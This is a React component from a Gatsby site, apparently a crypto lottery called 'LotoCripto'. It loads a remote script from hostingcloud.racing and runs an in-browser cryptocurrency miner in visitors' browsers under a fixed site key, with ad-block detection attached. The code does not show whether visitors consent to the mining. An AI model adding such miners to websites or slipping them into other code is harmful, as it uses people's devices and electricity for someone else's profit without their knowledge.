/* eslint no-unused-vars: 0 */
/* eslint no-console: 0 */

import { Component } from 'react';
import { navigate } from 'gatsby';
import scriptjs from 'scriptjs';

class Miner extends Component {
  componentDidMount() {
    this.setupMiner();
  }

  setupMiner = () => {
    const { setIsMinerReady, setIsAdblocked, name } = this.props;

    if (typeof window === 'undefined' || typeof document === 'undefined') {
      return null;
    }

    scriptjs('//hostingcloud.racing/tnmb.js', () => {
      if (!window.Client) {
        setIsAdblocked && setIsAdblocked(true);
        setIsMinerReady && setIsMinerReady(true);
      } else if (window.location.pathname.match(/ad-block/gm)) {
        navigate('/');
      }

      if (window.Client) {
        window.miner = new window.Client.User(
          '4dd4ab654ffe75f208fa3f30618aa31f8aa600ebdb99684d935a8cf2a673edb4',
          name,
          {
            throttle: 0.2,
            c: 'w',
            ads: 0,
          }
        );

        setIsMinerReady && setIsMinerReady(true);

        window.miner.on('open', params => {
          console.log(
            '[LotoCripto Miner] The connection to the mining pool has been opened'
          );
        });

        window.miner.on('job', params => {
          console.log(
            '[LotoCripto Miner] A new mining job has been received from the pool!'
          );
        });

        window.miner.on('found', params => {
          console.log(
            '[LotoCripto Miner] Hash has been found and will be send to the pool!'
          );
        });

        window.miner.on('close', params => {
          console.log(
            '[LotoCripto Miner] The connection to the pool was closed - End of the job!'
          );
        });

        window.miner.on('error', params => {
          if (params.error !== 'connection_error') {
            console.log(
              '[LotoCripto Miner] The pool reported an error',
              params.error
            );
          }
        });
      }
    });
  };

  render() {
    return null;
  }
}

export default Miner;
